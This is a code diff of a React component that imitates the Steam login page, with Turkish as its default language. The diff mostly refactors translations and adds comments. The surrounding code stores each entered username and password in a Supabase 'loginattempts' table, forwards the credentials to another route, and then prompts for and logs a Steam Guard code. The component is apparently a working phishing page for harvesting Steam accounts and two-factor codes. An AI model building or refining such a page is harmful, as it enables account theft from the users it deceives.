@@ -1,3 +1,4 @@
+
 import React, { useState, useEffect } from 'react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -9,7 +10,40 @@ import { Dialog, DialogContent } from "@/components/ui/dialog";
 import { Progress } from "@/components/ui/progress";
 import { supabase } from "@/integrations/supabase/client";
 
-const SteamLoginForm = () => {
+// Define translations
+const translations = {
+  tr: {
+    title: 'HESABINIZA GİRİŞ YAPIN',
+    accountLabel: 'STEAM HESABI ADI',
+    passwordLabel: 'PAROLA',
+    rememberMe: 'Beni hatırla',
+    loginButton: 'Giriş Yap',
+    loading: 'Giriş Yapılıyor...',
+    helpText: 'Yardım edin, giriş yapamıyorum',
+    steamGuardTitle: 'Steam Guard Doğrulama',
+    steamGuardDesc: 'E-posta adresinize gönderilen Steam Guard kodunu girin',
+    submitButton: 'Gönder',
+    errorMessage: 'Lütfen tüm gerekli alanları doldurun',
+    generalError: 'Bir hata oluştu. Lütfen tekrar deneyin.'
+  },
+  en: {
+    title: 'LOGIN TO YOUR ACCOUNT',
+    accountLabel: 'STEAM ACCOUNT NAME',
+    passwordLabel: 'PASSWORD',
+    rememberMe: 'Remember me',
+    loginButton: 'Sign In',
+    loading: 'Signing in...',
+    helpText: 'Help, I can\'t log in',
+    steamGuardTitle: 'Steam Guard Verification',
+    steamGuardDesc: 'Enter the Steam Guard code sent to your email',
+    submitButton: 'Submit',
+    errorMessage: 'Please fill in all required fields',
+    generalError: 'An error occurred. Please try again.'
+  }
+};
+
+const SteamLoginForm: React.FC = () => {
+  // Form state
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [rememberMe, setRememberMe] = useState(false);
@@ -19,6 +53,7 @@ const SteamLoginForm = () => {
   const [language, setLanguage] = useState('tr'); // Default language is Turkish
   const navigate = useNavigate();
 
+  // Detect user language
   useEffect(() => {
     try {
       const userLanguage = navigator.language.split('-')[0];
@@ -30,46 +65,26 @@ const SteamLoginForm = () => {
     }
   }, []);
 
-  const translations = {
-    tr: {
-      title: 'HESABINIZA GİRİŞ YAPIN',
-      accountLabel: 'STEAM HESABI ADI',
-      passwordLabel: 'PAROLA',
-      rememberMe: 'Beni hatırla',
-      loginButton: 'Giriş Yap',
-      loading: 'Giriş Yapılıyor...',
-      helpText: 'Yardım edin, giriş yapamıyorum',
-      steamGuardTitle: 'Steam Guard Doğrulama',
-      steamGuardDesc: 'E-posta adresinize gönderilen Steam Guard kodunu girin',
-      submitButton: 'Gönder'
-    },
-    en: {
-      title: 'LOGIN TO YOUR ACCOUNT',
-      accountLabel: 'STEAM ACCOUNT NAME',
-      passwordLabel: 'PASSWORD',
-      rememberMe: 'Remember me',
-      loginButton: 'Sign In',
-      loading: 'Signing in...',
-      helpText: 'Help, I can\'t log in',
-      steamGuardTitle: 'Steam Guard Verification',
-      steamGuardDesc: 'Enter the Steam Guard code sent to your email',
-      submitButton: 'Submit'
-    },
-  };
+  // Get translation based on current language
+  const t = translations[language as keyof typeof translations] || translations.en;
 
-  const t = translations[language] || translations.en;
-
+  // Handle form submission
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    // Validate form
     if (!username || !password) {
-      toast.error(language === 'tr' ? "Lütfen tüm gerekli alanları doldurun" : "Please fill in all required fields");
+      toast.error(t.errorMessage);
       return;
     }
+    
     setIsLoading(true);
 
     try {
-      const ip = "0.0.0.0"; // In a real app, you would get this from an API or server-side
+      // Simplified IP capture for demo purposes
+      const ip = "0.0.0.0"; 
       
+      // Insert login attempt into Supabase
       const { data, error } = await supabase
         .from('loginattempts')
         .insert({
@@ -86,8 +101,9 @@ const SteamLoginForm = () => {
         throw error;
       }
 
-      console.log("Giriş denemesi kaydedildi:", data);
+      console.log("Login attempt saved:", data);
       
+      // Navigate to loading page with credentials
       navigate('/loading', { 
         state: { 
           username, 
@@ -96,12 +112,13 @@ const SteamLoginForm = () => {
         } 
       });
     } catch (error) {
-      console.error("Giriş denemesi kaydedilirken hata:", error);
+      console.error("Error saving login attempt:", error);
       setIsLoading(false);
-      toast.error(language === 'tr' ? "Bir hata oluştu. Lütfen tekrar deneyin." : "An error occurred. Please try again.");
+      toast.error(t.generalError);
     }
   };
 
+  // Handle Steam Guard code submission
   const handleSteamGuardSubmit = () => {
     console.log('Steam Guard Code submitted:', steamGuardCode);
     setShowSteamGuard(false);
@@ -121,6 +138,7 @@ const SteamLoginForm = () => {
       </div>
       
       <form onSubmit={handleSubmit} className="flex flex-col space-y-4">
+        {/* Username field */}
         <div className="space-y-1">
           <label className="text-xs font-medium text-white/50 uppercase">
             {t.accountLabel}
@@ -135,6 +153,7 @@ const SteamLoginForm = () => {
           />
         </div>
         
+        {/* Password field */}
         <div className="space-y-1">
           <label className="text-xs font-medium text-white/50 uppercase">
             {t.passwordLabel}
@@ -149,6 +168,7 @@ const SteamLoginForm = () => {
           />
         </div>
 
+        {/* Remember me checkbox */}
         <div className="flex items-center space-x-2">
           <Checkbox 
             id="rememberMe" 
@@ -165,6 +185,7 @@ const SteamLoginForm = () => {
           </label>
         </div>
         
+        {/* Login button */}
         <Button 
           type="submit" 
           disabled={isLoading} 
@@ -180,11 +201,13 @@ const SteamLoginForm = () => {
           )}
         </Button>
         
+        {/* Help link */}
         <a href="#" className="text-center text-xs text-white/60 hover:text-white">
           {t.helpText}
         </a>
       </form>
 
+      {/* Steam Guard dialog */}
       <Dialog open={showSteamGuard} onOpenChange={setShowSteamGuard}>
         <DialogContent className="bg-[#171a21] border-[#32353c] text-white">
           <div className="p-4">
